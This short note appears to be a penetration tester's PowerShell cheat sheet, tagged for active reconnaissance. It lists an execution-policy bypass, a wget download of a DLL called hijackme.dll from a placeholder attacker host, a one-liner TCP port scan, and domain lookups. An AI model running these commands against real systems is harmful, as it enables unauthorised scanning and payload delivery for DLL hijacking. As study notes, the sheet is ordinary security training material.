tags: #type/theory 

---
**Type:** #type/tool
**Tags:**  #tech/shell #tech/OS/windows #tactic/reconnaissance/active  
**Link:** 
**Purpose:** default shell on modern windows

---
# Info

# Usage
execution policies bypassed
	`powershell.exe -nop -exec bypass`: run powershell with 
download file from attacker machine
	`wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll`
perform tcp port scan
	`1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null`
test connection on one tcp port
	`Test-NetConnection -Port 445 192.168.50.151`
print the current domain
`(Get-CimInstance Win32_ComputerSystem).Domain` or `$env:USERDOMAIN`
